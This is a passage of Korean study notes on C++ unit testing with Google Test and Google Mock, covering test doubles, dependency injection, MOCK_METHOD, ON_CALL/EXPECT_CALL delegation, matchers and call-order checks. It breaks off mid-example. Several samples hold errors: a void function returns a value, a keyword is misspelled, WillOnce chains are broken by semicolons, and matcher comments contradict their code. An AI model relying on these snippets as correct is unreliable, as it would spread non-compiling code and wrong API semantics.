Test Framework 표준 아님\nEvent Listener 생성 방법\ntesting::TestEventListener : 모든 event 들에 대해 가상함수로 선언된 인터페이스 모든 event 에 대해서만 재정의를 해 주어야 선언 가능 testing::EmptyTestEventListener : 모든 event 들에 대해 override 형태로 empty 함수로 구현된 인터페이스 필요한 event 에 대해서만 재정의를 해 주면 선언 가능 class MyListener : public testing::EmptyTestEventListener { public: void OnTestSuiteStart(const TestSuite\u0026amp; /*test_suite*/) override { std::cout \u0026lt;\u0026lt; \u0026#34;START \u0026lt;\u0026lt; std::endl; } void OnTestSuiteEnd(const TestSuite\u0026amp; /*test_suite*/) override { std::cout \u0026lt;\u0026lt; \u0026#34;END \u0026lt;\u0026lt; std::endl; } } 정의된 Listener 들은 main 함수에서 등록한다.\nint main(int argc, char** argv) { testing::InitGoogleTest(\u0026amp;argc, argv); testing::TestEventListeners\u0026amp; litensers = testing::UnitTest::GetInstance()-\u0026gt;listeners(); litensers.Append(new MyListener); // google test framework 에 default 로 설정된 출력을 제거할 수도 있음 // delete litensers.Release(litensers.default_result_printer()); return RUN_ALL_TESTS(); } Test Double (테스트 대역) 테스트 대상 코드가 다른 \u0026ldquo;협력 객체\u0026quot;에 따라 영향을 받을 수 있을 때, \u0026ldquo;협력 객체\u0026rdquo; 를 대체 하기 위한 테스트용 객체를 생성하고, 이를 \u0026ldquo;테스트 대역\u0026rdquo; (test double) 이라 한다.\n테스트 대역의 역할 : 테스트 환경을 통제\n테스트 대역 적용 조건 : 제품 코드가 태스트 대역을 적용 할 수 있는 설계\n테스트 대상 코드가 협력 객체와 \u0026ldquo;약한 결합\u0026rdquo; (느슨한 결합) 관계에 있어야 한다. 강한 결합 : 구체적인 타입에 의존하여 객체를 참조하는 형태 약한 결합 : 추상 타입에 의존하여 객체를 참조하는 형태 (abstract class / interface) ex) 원본 코드\nclass FileSystem { public: bool IsValidFilename(const std::string\u0026amp; name) { // 현재의 파일 시스템에서 적합한 이름인지 확인합니다. return false; // fasle 반환하는 경우 검증을 위한 코드 } }; class Logger { public: // 확장자를 제외한 파일명이 5글자 이상이어야 한다. // ex) // file.log =\u0026gt; file =\u0026gt; X // hello.log =\u0026gt; hello =\u0026gt; O bool IsValidLogFilename(const std::string\u0026amp; filename) { //--------- 테스트 대상 코드 영역 size_t index = filename.find_last_of(\u0026#34;.\u0026#34;); std::string name = filename.substr(0, index); if (name.size() \u0026lt; 5) { return false; } //--------- 테스트 대상 코드 영역 FileSystem fs; return fs.IsValidFilename(filename); // 테스트 대상이 아니지만 테스트 결과에 영향을 끼치는 구문 } }; ex) SUT 코드를 약한 결합으로 변경하고 test double 적용\nSUT 코드에 협력 객체에 대한 인터페이스를 정의\nclass IFileSystem { public: virtual ~IFileSystem() { } virtual bool IsValidFilename(const std::string\u0026amp; name) = 0; // 순수 가상 함수로 정의 }; SUT 코드에서 협력 객체가 인터페이스를 사용하도록 변경\nclass FileSystem : public IFileSystem { public: bool IsValidFilename(const std::string\u0026amp; name) override { // 현재의 파일 시스템에서 적합한 이름인지 확인합니다. return false; // fasle 반환하는 경우 검증을 위한 코드 } }; test code 에서 Test double 용 class 생성\nclass TestDoubleFileSystem : public IFileSystem { public: bool IsValidFilename(const std::string\u0026amp; name) override { return true; // 무조건 true 반환하도록 } }; Dependency Injection (의존성 주입) 으로 협력객체를 test double 로 대체\nclass 내부에서 선언하지 않고, 외부에서 선언된 객체를 받아야 한다. 생성자 주입 : 협력 객체가 필수적일 때 method 주입 : 협력 객체가 필수적이지 않을 때 TEST(LoggerTest, IsValidLogFilename_NameLongerThan5Chars_ReturnsTrue) { TestDoubleFileSystem td; // 3번에서 정의한 class 사용 Logger logger { \u0026amp;td }; // 의존성 주입. 외부에서 선언하고 Logger 에 전달 std::string validFilename = \u0026#34;valid.log\u0026#34;; // 변수 이름에도 가독성 고려 EXPECT_TRUE(logger.IsValidLogFilename(validFilename)) \u0026lt;\u0026lt; \u0026#34;확장자를 제외한 파일명이 5글자 이상 판단 실패\u0026#34;; } TEST(LoggerTest, IsValidLogFilename_NameShorterThan5Chars_ReturnsFalse) { TestDoubleFileSystem td; Logger logger { \u0026amp;td }; std::string invalidFilename = \u0026#34;bad.log\u0026#34;; EXPECT_FALSE(logger.IsValidLogFilename(invalidFilename)) \u0026lt;\u0026lt; \u0026#34;확장자를 제외한 파일명이 5글자 미만 판단 실패\u0026#34;; } // test case 에서 호출되는 IsValidFilename() 은 TestDoubleFileSystem 함수에서 정의된 함수가 호출되기 때문에 true 가 반환된다. Test Stub 목적 : 다른 Component로 부터의 받은 값(간접 입력)에 의존하는 로직을 독립적으로 검증이 필요할 때\n방법 : 입력 값을 생성하는 Component 를 test double 로 교체한다.\n예시 : 현재 시간의 값에 영향을 받는 Clock 이라는 class 에서 값을 받아 사용하는 Scheduler class 의 Alarm 함수 테스트를 위해, Clock 을 대체 할 test double class 를 생성\nclass Time { public: virtual ~Time() { } virtual std::string GetCurrentTime() const = 0; }; // 인터페이스 사용하여 구현되어 있어 test double 적용이 용이한 형태 class Clock : public Time { public: std::string GetCurrentTime() const override { time_t rawTime; tm* timeInfo; char buffer[128]; time(\u0026amp;rawTime); timeInfo = localtime(\u0026amp;rawTime); strftime(buffer, sizeof(buffer), \u0026#34;%H:%M\u0026#34;, timeInfo); return std::string { buffer }; } }; class Scheduler { Time* time; public: Scheduler(Time* p) : time { p } { } int Alarm() { std::string current = time-\u0026gt;GetCurrentTime(); // 다른 component 에서 받은 값에 의존적 if (current == \u0026#34;00:00\u0026#34;) { return 42; } else if (current == \u0026#34;10:00\u0026#34;) { return 100; } return 0; } }; test stub pattern 을 적용하여 테스트의 독립성 확보 // test double class 를 새로 정의 class StubTime : public Time { std::string result; public: StubTime(const std::string\u0026amp; r) : result { r } { } std::string GetCurrentTime() const override { return result; } }; TEST(SchedulerTest, Alarm_00_00) { // Clock clock; StubTime clock { \u0026#34;00:00\u0026#34; }; // Clock 객체 대신 StubTime 객체 사용 Scheduler scheduler { \u0026amp;clock }; int result = scheduler.Alarm(); EXPECT_EQ(result, 42) \u0026lt;\u0026lt; \u0026#34;00:00 일때\u0026#34;; }; TEST(SchedulerTest, Alarm_10_00) { // Clock clock; StubTime clock { \u0026#34;10:00\u0026#34; }; Scheduler scheduler { \u0026amp;clock }; int result = scheduler.Alarm(); EXPECT_EQ(result, 100) \u0026lt;\u0026lt; \u0026#34;10:00 일때\u0026#34;; }; Fake Object 목적 : 협력 객체의 로직이 아직 미구현인 상태라 테스트가 불가능한 상황 해소 or 협력 객체가 사용하기 어려운 경우 or 협력 객체의 동작이 느린 경우 방법 : 동일한 기능을 제공하는 가벼운 test double 을 통해 검증을 수행한다. Test Stub 과 비교했을 때, test stub은 logic이 없지만, fake object 는 가볍더라도 logic 이 포함된다. 예시 : database 기능을 대체할 수 있는 간이 class 를 선언 // SUT에 정의된 사용자 정의 타입 class User { std::string name; int age; public: User(const std::string\u0026amp; s, int n) : name { s }, age { n } std::string GetName() const { return name; } int GetAge() const { return age; } }; // 데이터베이스 인터페이스 class IDatabase { public: virtual ~IDatabase() { } virtual void SaveUser(const std::string\u0026amp; name, User* user) = 0; virtual User* LoadUser(const std::string\u0026amp; name) = 0; }; // 데이터베이스(미구현) class 를 사용하는 class. 테스트 대상 class Repository { IDatabase* database; public: Repository(IDatabase* p) : database { p } { } void Save(User* user) { //... database-\u0026gt;SaveUser(user-\u0026gt;GetName(), user); //... } User* Load(const std::string\u0026amp; name) { // ... return database-\u0026gt;LoadUser(name); } }; // 테스트를 위해 생성한 Fake class class FakeDatebase : public IDatabase { std::map\u0026lt;std::string, User*\u0026gt; data; public: void SaveUser(const std::string\u0026amp; name, User* user) override { data[name] = user; } User* LoadUser(const std::string\u0026amp; name) override { return data[name]; } }; // 사용자 지정 타입의 비교를 위해 연산자 재정의 bool operator==(const User\u0026amp; lhs, const User\u0026amp; rhs) { return lhs.GetName() == rhs.GetName() \u0026amp;\u0026amp; lhs.GetAge() == rhs.GetAge(); } // 사용자 지정 타입의 출력을 위해 연산자 재정의 std::ostream\u0026amp; operator\u0026lt;\u0026lt;(std::ostream\u0026amp; os, const User\u0026amp; user) { retrurn os \u0026lt;\u0026lt; \u0026#34;(\u0026#34; \u0026lt;\u0026lt; user.GetName() \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; user.GetAge() \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; } // 테스트 수행 TEST(RepositoryTest, Save) { FakeDatebase fake; // Fake class 사용 Repository repo { \u0026amp;fake }; // 의존성 주입 std::string testName = \u0026#34;test_name\u0026#34;; int testAge = 42; User expected { testName, testAge }; repo.Save(\u0026amp;expected); User* actual = repo.Load(testName); ASSERT_NE(actual, nullptr); // null pointer 로 인한 프로그램 에러 방지 EXPECT_EQ(*actual, expected); } Test Spy 목적: SUT의 함수를 동작 할 때 발생하는 부수 효과를 관찰할 수 없어서 테스트가 어려운 경우 특정 함수의 동작 결과를 저장 해 두었다가 나중에 출력 할 수 있는 test double 구현 방법: 목격한 일을 기록 해 두었다가 이후 확인 할 수 있도록 만들어진 테스트 대역 다른 component로 부터의 간접 출력을 저장하는 기능 존재 저장된 간접 출력들로 합불을 판단판단 할 수 있는 기능 존재 예시: Logger 에서 호출되는 Write 함수는 결과를 확인 할 상태가 남지 않는다. DLoggerTarget 을 상속받는 test double 을 생성하여 Write 함수로 전달받은 내용을 저장하고, 나중에 확인 할 수 있도록 하는 로직을 추가한다. enum Level { INFO, WARN, ERROR }; // 인터페이스 class DLoggerTarget { public: virtual ~DLoggerTarget() { } virtual void Write(Level level, const std::string\u0026amp; message) = 0; }; // 실제 구현체 class FileTarget : public DLoggerTarget { // 전달된 내용을 파일에 기록합니다. }; // 실제 구현체 class NetworkTarget : public DLoggerTarget { // 전달된 내용을 네트워크로 전송합니다. }; // 테스트 필요한 대상 class DLogger { std::vector\u0026lt;DLoggerTarget*\u0026gt; targets; public: void AddTarget(DLoggerTarget* p) { targets.push_back(p); } void Write(Level level, const std::string\u0026amp; message) { for (auto e : targets) { e-\u0026gt;Write(level, message); // 결과가 남지 않아 테스트 어려움 } } }; // test double 을 생성 class SpyTarget : public DLoggerTarget { std::vector\u0026lt;std::string\u0026gt; history; // 전달 된 string 을 vector 에 저장 std::string Concat(Level level, const std::string\u0026amp; message) const { return message + std::to_string(level); // 최종 결과를 이어붙여 반환 } public: void Write(Level level, const std::string\u0026amp; message) override { // 목격한 일을 기록 history.push_back(Concat(level, message)); } // 동작 결과를 판단하는 기능 bool IsReceived(Level level, const std::string\u0026amp; message) const { return std::find(std::begin(history), std::end(history), Concat(level, message)) != std::end(history); } }; // test code TEST(DLoggerTest, Write) { DLogger logger; SpyTarget t1, t2; logger.AddTarget(\u0026amp;t1); logger.AddTarget(\u0026amp;t2); logger.Write(INFO, \u0026#34;test_message1\u0026#34;); logger.Write(WARN, \u0026#34;test_message2\u0026#34;); EXPECT_TRUE(t1.IsReceived(INFO, \u0026#34;test_message1\u0026#34;)); // 테스트 결과 판단 EXPECT_TRUE(t2.IsReceived(INFO, \u0026#34;test_message1\u0026#34;)); EXPECT_TRUE(t1.IsReceived(WARN, \u0026#34;test_message2\u0026#34;)); EXPECT_TRUE(t2.IsReceived(WARN, \u0026#34;test_message2\u0026#34;)); } test code 가 SUT code 보다 더 많아지는 딜레마가 발생한다. Mock Object 목적 : \u0026ldquo;상태기반 검증\u0026quot;이 아닌 \u0026ldquo;행위기반 검증\u0026quot;을 수행\n상태기반 검증 : SUT에 작용을 가한 후 내부 상태 변화를 확인하고 단언문을 통해 정상 동작 여부를 판단 행위 기반 검증 : SUT 에 작용을 가한 후 함수 호출 여부, 호출 횟수, 호출 인자, 호출 순서 등의 정보를 통해 정상 동작 여부를 판단 방법 : Mock Framework 라는 별도의 framework 를 사용하여 구현\nGoogle Mock 을 활용할 수 있다. Google Mock 사용 방법 Mock 을 사용한 검증은 초창기에는 별도의 테스트로 여겨졌으나, 현재는 단위테스트 수행시 기본적으로 수행하는 추세가 되었다.\n사용 방법:\n모의 객체를 생성하고, MOCK_METHOD 매크로를 활용하여 테스트 할 함수를 설정한다. MOCK_METHOD{인자갯수}(method 이름, method 타입) : MOCK_METHOD 사용 방법 class MockDLoggerTarget : public DLoggerTarget { public: // void Write(Level level, const std::string\u0026amp; message) // 행위 기반 검증을 수행하고자 하는 메소드 MOCK_METHOD2(Write, void(Level level, const std::string\u0026amp; message)); // mock 함수 생성 }; EXPECT_CALL 매크로를 사용하여 함수가 수행 되어야 한다는 것을 미리 설정 해 둔다. 이후 EXPECT_CALL 로 설정 한 함수가 호출되지 않으면 에러가 발생한다. EXPECT_CALL(class 이름, 함수 호출구문) 형태로 사용한다. 주의 사항: EXPECT_CALL 구문이 ASSERT_, EXPECT_ 와 같은 상태기반 검증의 단언문보다 먼저 수행되는 형태가 좋다. TEST(DLoggerTest, Write) { // Arrange DLogger logger; MockDLoggerTarget t1, t2; logger.AddTarget(\u0026amp;t1); logger.AddTarget(\u0026amp;t2); // Assert // 행위 기반 검증 단언문 먼저 설정 EXPECT_CALL(t1, Write(INFO, \u0026#34;test_message1\u0026#34;)); EXPECT_CALL(t1, Write(WARN, \u0026#34;test_message2\u0026#34;)); EXPECT_CALL(t2, Write(INFO, \u0026#34;test_message1\u0026#34;)); EXPECT_CALL(t2, Write(WARN, \u0026#34;test_message2\u0026#34;)); // Act // 상태 기반 검증 단언문 logger.Write(INFO, \u0026#34;test_message1\u0026#34;); logger.Write(WARN, \u0026#34;test_message2\u0026#34;); } 장점 : 행위 검증을 위한 Lobic 작성이 필요 없음\nGoogle Mock Google Mock 은 행위기반 검증만을 위한 tool 이 아니라, test double 을 위한 tool 로서, test stub, fake object, test spy 등을 google Mock 으로 구현 할 수도 있다. 설치 googletest 소스코드를 다운받으면 googletest/googlemock/src/gmock-all.cc 파일을 include 하여 사용 가능하다. google mock 사용에 필요한 소스코드를 컴파일 한다. g++ -c ./googletest/googlemock/src/gmock-all.cc -I ./googletest/googlemock/include -I ./googletest/googlemock/ -I ./googletest/googletest/include/ -std=c++14 -O2 : gtest-all.o, gmock-all.o 컴파일 main 함수에서 InitGoogleMock 을 호출하도록 한다. googletest/googlemock/src/gmock_main.cc 파일에 있는 main을 활용할 수 있다. g++ -c -std=c++14 -O2 ./googletest/googlemock/src/gmock_main.cc -I ./googletest/googletest/include -I ./googletest/googlemock/include : gmock-main.o 컴파일 라이브러리 생성 ar rcv libgtest.a gmock-all.o gtest-all.o gmock_main.o : 컴파일 한 목적 파일로 libgtest.a 라이브러리를 생성한다. 소스코드에 헤더 파일을 include 한다. #include \u0026lt;gmock/gmock.h\u0026gt; gmock 만 include 하면 gtest 는 자동으로 include 된다. 이후 소스코드 빌드할 떄 아래 스크립트를 사용한다. #!/bin/sh # file name : build.sh g++ $1 -I ./googletest/googletest/include/ -I ./googletest/googlemock/include/ -lgtest -L. -std=c++14 -pthread # -fsanitize=address # 필요하다면 추가 ./build.sh FILE_NAME 사용 Google Test 1.10 이후 MOCK_METHOD{인자갯수}(method name, method type) 형태는 MOCK_METHOD(return type, method name, parameter, 한정자) 형태로 변경됨\nex) class MyClass { public: void myFunc(int A, std::string B, char* c) = 0; // 원본 가상함수 virtual std::string func1() const = 0; // 인자가 없는 형태 virtual void func2() const noexcept = 0; // 한정자가 여러개인 형태 virtual std::pair\u0026lt;bool, int\u0026gt; func3() const = 0; // 탬플릿 타입을 사용하는 함수 virtual bool func4(std::map\u0026lt;std::string, int\u0026gt; a, bool b) const = 0; }; class MockClass : public MyClass { public: // void myFunc(int A, std::string B, char* c) override // 만들고 싶은 함수 형태 MOCK_METHOD(void, myFunc, (int A, std::string B, char* c), (override)) // MOCK_METHOD 선언 // 한정자도 2개 이상 있을 수 있기 때문에 괄호로 묶어준다. MOCK_METHOD(std::string, func1, (), (const, override)); MOCK_METHOD(void, func2, (), (const, noexcept, override)); MOCK_METHOD((std::pair\u0026lt;bool, int\u0026gt;), func3, (), (const, override)); MOCK_METHOD(bool, func4, ((std::map\u0026lt;std::string, int\u0026gt;) a, bool b), (const, override)); }; override 는 원본에는 없고, 쓰지 않아도 문법상 오류는 없지만, 추가 해 주어야 하는 한정자이다. 주의사항1: 매크크로 함수의 특성상 \u0026lsquo;,\u0026rsquo; 로 인자를 구분하는데, 탬플릿 타입에 사용되는 \u0026lsquo;,\u0026rsquo; 때문에 파싱 오류가 나지 않도록, 탬플릿 타입은 괄호로 묶어주도록 주의한다. SUT 에서 구현된 class 중, 순수 가상함수가 아닌 함수들은 행위기반 검증이 필요한 경우만 선택적으로 MOCK_METHOD 화 시켜주면 된다.\n주의사항2: MOCK_METHOD 와 동일한 이름의 함수가 부모에 존재한다면, MOCK_METHOD 에 가려져서 mock class 에서 해당 함수의 호출이 불가능하다.\nex) class SUT{ public: // 두 개의 버전이 존재 virtual void func(int a) {} virtual void func() {} }; class MockSUT : public SUT{ public: MOCK_METHOD(void, func, (), (override)); using SUT::func; }; TEST(TS, TC) { MockSUT m; m.func(1); // `using SUT::func` 구문 없으면 오류 발생. \u0026#39;TEST\u0026#39; 구문 안에서 직접 호출시에만 문제 발생 m.func(); } 탬플릿 기반 인터페이스/추상클래스 도 MOCK_METHOD 적용 가능 ex) template \u0026lt;typename T\u0026gt; class SUT { public: virtual ~SUT() { } virtual int func1() const { return 0; } virtual void func2(const T\u0026amp; data) = 0; }; template \u0026lt;typename TYPE\u0026gt; class MockSUT : public SUT\u0026lt;TYPE\u0026gt; { public: MOCK_METHOD(int, func1, (), (const, override)); MOCK_METHOD(void, func2, (const TYPE\u0026amp; data), (override)); }; 의존성 주입을 사용하면, 제품 코드를 사용하는 방식 그대로 테스트를 수행할 수 있다.\n// 인터페이스 class IPacketStream { public: virtual ~IPacketStream() { } virtual void AppendPacket(Packet* newPacket) = 0; virtual const Packet* GetPacket(size_t packetNumber) const = 0; }; // 협력객체 class class PacketStream : public IPacketStream { public: void AppendPacket(Packet* newPacket) override { std::cout \u0026lt;\u0026lt; \u0026#34;AppendPacket\u0026#34; \u0026lt;\u0026lt; std::endl; } const Packet* GetPacket(size_t packetNumber) const override { std::cout \u0026lt;\u0026lt; \u0026#34;GetPacket: \u0026#34; \u0026lt;\u0026lt; packetNumber \u0026lt;\u0026lt; std::endl; return nullptr; } }; // 인터페이스로 구현된 테스트 필요한 SUT 코드 class PacketReader { public: void ReadPacket(IPacketStream* stream, size_t packetNumber) { // ... stream-\u0026gt;AppendPacket(nullptr); stream-\u0026gt;GetPacket(packetNumber); } }; // 협력객체를 대체할 테스트용 Mock class class MockPacketStream : public IPacketStream { public: // void AppendPacket(Packet* newPacket) override MOCK_METHOD(void, AppendPacket, (Packet * newPacket), (override)); // const Packet* GetPacket(size_t packetNumber) const override MOCK_METHOD(const Packet*, GetPacket, (size_t packetNumber), (const, override)); }; C++에서는 명시적 인터페이스 외 암묵적 인터페이스를 통해 의존성 주입 설계를 수행할 수 있다.\nC++ 의 탬플릿 기능을 활용하면 인터페이스를 따로 정의하지 않고 그 기능을 대체 할 수 있다. class PacketReader { public: template \u0026lt;typename IPacketStream\u0026gt; // 이 구문을 추가해 줌으로서 인터페이스를 구현한 것과 동일한 효과 void ReadPacket(IPacketStream* stream, size_t packetNumber) { // ... stream-\u0026gt;AppendPacket(nullptr); stream-\u0026gt;GetPacket(packetNumber); } }; Policy Based Design (단위 전략) : 탬플릿 기반으로 정책을 컴파일 시간에 교체 가능 장점 : 가상함수 기반이 아니기 때문에 inline 최적화가 가능하다. 단점 : 실행 시간에 정책 교체가 불가능하다. C++에 한정하여 적용 가능하다. Mock 의 종류\nNaggyMock Google Mock 의 기본 타입은 NaggyMock 이다. MOCK_METHOD 를 생성하고, EXPECT_CALL 로 감시 처리 하지 않았지만 test case 수행 결과 해당 함수가 호출이 된다면 실행 결과에 warning 메시지를 출력시킨다. 실행 결과에는 영향을 주지는 않는다. NiceMock using testing::NiceMock 구문을 추가하고 NiceMock\u0026lt;MockSUT\u0026gt; mock 으로 선언한다. NaggyMock 을 사용 할 때 warning 메시지를 띄우는 경우, NiceMock 을 사용하면 메시지가 출력되지 않는다. 행위기반 검증이 아닌 다른 목적으로 사용하는 경우 NiceMock 을 사용할 수 있다. StrictMock using testing::StrictMock 구문을 추가하고 StrictMock\u0026lt;MockSUT\u0026gt; mock 으로 선언한다. NaggyMock 을 사용 할 때 warning 메시지를 띄우는 case 에 error 를 발생시킨다. 테스트를 통과하는 기준이 높아져서 테스트 비용이 증가할 수 있으므로 주의해서 사용해야 한다. Delegating\n주의사항3: MOCK_METHOD 로 만들어진 함수는 return 값이 달라지게 된다. (0을 반환)\nGoogle Test Framework 에는 MOCK_METHOD 의 반환값을 제어할 수 있는 기능을 제공하며, 이를 Delegating 이라 한다.\nON_CALL 매크로를 활용하면 Delegating 설정을 할 수 있다.\nclass SUT { public: void func(int a, int b) { return 10;} }; class MockSUT : public SUT{ public: MOCK_METHOD(void, func, (int a, int b), (override)); }; using testing::Return; TEST(TS, TC) { MockSUT m; ON_CALL(m, func(1, 2)).WillByDefault(Return(10)); // func(1, 2) 결과가 10 반환 EXPECT_CALL(m, func(1, 2)); m.func(1,2); // 호출은 a, b, c 모두 사용 } 아래와 같은 방식으로도 사용 할 수 있다.\n원본 함수: Add(int a, int b) { return a + b; } ON_CALL(mock, Add(10, 20)).WillByDefault(Return(30)); : Add(10,20) 은 30 을 반환하도록 설정 ON_CALL(mock, Add).WillByDefault(Return(30)); : Add 함수는 인자에 상관없이 30을 반환하도록 설정 ON_CALL(mock, Add).WillByDefault(\u0026amp;add); Add 함수는 add라고 정의된 함수의 동작을 따라서 반환값 반환(단, Add와 add 의 함수 형태는 동일) int add(int a, int b) { return a + b; } ON_CALL(mock, Add).WillByDefault(Adder {}); : 구조체의 멤버 함수 사용 struct Adder {int operator()(int a, int b) const { return a + b; }}; ON_CALL(mock, Add).WillByDefault([](int a, int b) { return a + b; }); : 람다 표현식으로 Add 의 반환값 설정 ON_CALL 명령은 test case에 작성해도 되지만, mock class 생성자에 선언해도 된다.\n// mock class 선언 class MockDatabase : public IDatabase { std::map\u0026lt;std::string, User*\u0026gt; data; public: // 생성자 선언 MockDatabase() { // 생성자에서 ON_CALL 설정, ON_CALL 구문 중복 방지 ON_CALL(*this, SaveUser).WillByDefault([this](const std::string\u0026amp; name, User* user) { data[name] = user; }); ON_CALL(*this, LoadUser).WillByDefault([this](const std::string\u0026amp; name) { return data[name]; }); } // void SaveUser(const std::string\u0026amp; name, User* user) override MOCK_METHOD(void, SaveUser, (const std::string\u0026amp; name, User* user), (override)); // User* LoadUser(const std::string\u0026amp; name) override MOCK_METHOD(User*, LoadUser, (const std::string\u0026amp; name), (override)); }; Delegating 기능을 사용하여 Test Stub, Fake Object, Test Spy 를 모두 구현할 수 있다.\nEXPECT_CALL 과 ON_CALL 을 동시에 사용할 경우 EXPECT_CALL 만 사용해서 Delegation 을 사용 할 수 있다.\nWillOnce, WillRepeatedly 구문을 추가하면 EXPECT_CALL 구문에 ON_CALL 내용을 적용 할 수 있다. WillOnce 는 여러 번 호출 가능하며, queue 에 쌓이듯이 순서대로 적용된다. WillOnce 사용 횟수만큼 함수가 호출되지 않으면 테스트 결과는 실패로 판단된다. WillOnce() : 인자로 들어간 ON_CALL 구문을 지정된 함수가 호출 될 떄 한 번만 적용 WillRepeatedly() : 인자로 들어간 ON_CALL 구문을 함수 호출마다 적용 한 번만 사용 가능 WillOnce 보다 나중에 사용 가능 // case 1 EXPECT_CALL(mock, func(10,20)).WillOnce(Return(30)); // 아래 두 구문을 한번에 표현 한 것이다. /* ON_CALL(mock, func(10,20)).WillByDefault(Return(30)); EXPECT_CALL(mock, func(10,20)); */ mock.func(10,20); // 30 반환 // case 2 EXPECT_CALL(mock, func(10,20)) .WillOnce(Return(30)); .WillOnce(Return(40)); .WillOnce(Return(50)); // 아래 구문을 한 번에 표현 한 것이다. /* ON_CALL(mock, func(10,20)).WillByDefault(Return(30)); EXPECT_CALL(mock, func(10,20)).Times(3); // WillOnce 세번 사용 */ mock.func(10,20); // 30 반환 mock.func(10,20); // 40 반환 mock.func(10,20); // 50 반환 // case 3 EXPECT_CALL(mock, func(10,20)) .WillOnce(Return(30)); .WillOnce(Return(40)); .WillRepeatedly(Return(50)); // 아래 구문을 한 번에 표현 한 것이다. /* ON_CALL(mock, func(10,20)).WillByDefault(Return(30)); EXPECT_CALL(mock, func(10,20)).Times(AtLeast(2)); // WillOnce 두번 사용 이후 willRepeatedly 사용 */ mock.func(10,20); // 30 반환 mock.func(10,20); // 40 반환 mock.func(10,20); // 50 반환 mock.func(10,20); // 50 반환 함수 호출 여부 판단\nEXPECT_CALL 을 사용하여 호출 여부를 확인할 수 있다. EXPECT_CALL 은 별도의 오류 메시지를 지정할 수 있는 기능을 제공하지 않는다. 감시 대상 함수가 호출되기 전 설정이 되어 있어야 한다. mock 객체가 파괴되는 시점에 EXPECT_CALL 로 감시를 선언한 함수들의 결과를 판단한다. 만약 mock 을 \u0026rsquo;new\u0026rsquo; 를 통해 생성했다면, 명시적으로 \u0026lsquo;delete\u0026rsquo; 를 해 줘야 정상 동작을 한다. mock 을 지역변수로 선언한다면 함수 종료시 자동으로 해제되기 때문에 정상 동작 할 것이다. 함수 호출 인자 판단\nex1) EXPECT_CALL(mock, func(1,2)) : func(1,2) 형태로 함수가 호출되어야 OK\nex2) EXPECT_CALL(mock, func) : 어떤 인자로든 func 함수가 호출 되기만 하면 OK\n특정 인자만 감시하려면 Mock 간략화 기능을 사용한다.\nMock 간략화 : 함수의 특정 인자에 대해서만 검증을 수행하고 싶을 때 사용하는 방식 class SUT{ public: void func(int a, int b, int c) {} }; class MockSUT : public SUT{ public: // parent 함수 override void func(int a, int b, int c) override { func(int a); // MOCK_METHOD 로 생성한 함수 호출 } MOCK_METHOD(void, func, (int a), (override)); // void func(int a) override {} 형태의 함수를 생성함 // -\u0026gt; }; TEST(TS, TC) { MockSUT m; EXPECT_CALL(m, func(1)); // 인자 a 에 대해서만 검증 m.func(1,2,3); // 호출은 a, b, c 모두 사용 } 호출 인자에 조건을 설정하려면 Matcher 를 사용할 수 있다.\nusing testing::Ge; using testing::Eq; using testing::Matcher; Matcher\u0026lt;int\u0026gt; arg0 = Ge(10); // 10보다 커야함 Matcher\u0026lt;int\u0026gt; arg1 = Eq(20); // 20보다 작아야함 EXPECT_CALL(mock, func(arg0, arg1)); // arg0은 10보다 작고, arg1은 20보다 커야 성공 논리연산 testing::Eq : == testing::Ne : != testing::Ge : \u0026gt;= testing::Gt : \u0026gt; testing::Le : \u0026lt;= testing::Lt : \u0026lt; testing::_ : 조건 없음(anything matcher) Matcher의 논리적 긱준을 and/or 조건으로 묶어서 사용할 수 있다. using testing::Matcher; using testing::Gt; using testing::Lt; using testing::_; using testing::AllOf; // and using testing::AnyOf; // or MyMockClass mock; // 필요한 mock class 정의 필요 Matcher\u0026lt;int\u0026gt; arg0 = AllOf(Gt(10), Lt(20)); // 10 초과 \u0026amp;\u0026amp; 20 미만 Matcher\u0026lt;int\u0026gt; arg1 = AnyOf(Gt(20), Lt(10)); // 10 미만 || 20 초과 EXPECT_CALL(mock, func(arg0, arg1, _ )).Times(3); mock.func(15,25, 128); mock.func(11,0, 256); mock.func(19,21, 512); Mock 간략화 대신 anything matcher 를 사용화 할 수도 있다.\nusing testing::_; EXPECT_CALL(mock, func(_, \u0026#34;arg\u0026#34;, _)); // 첫 번째, 두 번쨰 인자 신경 안쓰고 두 번쨰 인자에 \u0026#34;arg\u0026#34; 문자열이 오는지 판단 Matcher 적용 심화\n다중 인자 Matcher 적용 방법 using testing::ElementsAreArray; // 배열 형태로 구성 Matcher\u0026lt;int\u0026gt; args[] = { Eq(1), Eq(2), Eq(3) } EXPECT_CALL(moc, func(ElementsAreArray(args))); // 단순 열거 형태로 사용 using testing::ElementsAre; EXPECT_CALL(moc, func(ElementsAre(Eq(1), Eq(2), Eq(3)))); // 인자 순서 상관없이 모든 조건이 매칭될 수 있는지 체크 using testing::UnorderedElementsAre; EXPECT_CALL(moc, func(ElementsAre(Eq(1), Eq(2), Eq(3)))); testing::HasSubstr : 문자열 포함 여부 체크 testing::ContainsRegex : 정규표현식을 만족하는지 체크 Matcher Document 함수 호출 횟수 판단\nEXPECT_CALL(mock, func).Times(n) : \u0026ldquo;mock\u0026rdquo; class 의 함수 \u0026lsquo;func\u0026rsquo; 가 \u0026rsquo;n\u0026rsquo;번 호출되어야 성공 Times를 지정하지 않은 경우에는 기본적으로 .Times(1) 이 생략된 형태 EXPECT_CALL(mock, func).Times(AtLeast(n)) : \u0026ldquo;mock\u0026rdquo; class 의 함수 \u0026lsquo;func\u0026rsquo; 가 최소 n번 이상 호출되어야 성공 EXPECT_CALL(mock, func).Times(AtMost(n)) : \u0026ldquo;mock\u0026rdquo; class 의 함수 \u0026lsquo;func\u0026rsquo; 가 최대 n번 이하 호출되어야 성공 EXPECT_CALL(mock, func).Times(Between(n, m)) : \u0026ldquo;mock\u0026rdquo; class 의 함수 \u0026lsquo;func\u0026rsquo; 가 n 이상 m 이하 호출되어야 성공 Cardinality 개념을 적용하여 호출 횟수를 범위로 표현 using testing::AtLeast;, using testing::AtMost;, using testing::Between; 코드 추가 필요 함수 호출 순서 판단\nGoogle Mock 에서는 기본적으로 함수 호출 순서는 검증 대상에 포함되지 않는다. testing::InSequence 객체를 활용하여 함수 호출 순서를 검증할 수 있다. test code 에 InSequence 객체를 선언하면 해당 test case 에서는 모든 함수가 EXPECT_CALL 을 선언한 순서대로 호출되어야 테스트 결과가 성공으로 판단된다. Test(TS, TC) { InSequence seq; // 선언하고, 사용하지 않으면 자동으로 모든 EXPECT_CALL 에 적용됨 MyMock mock; 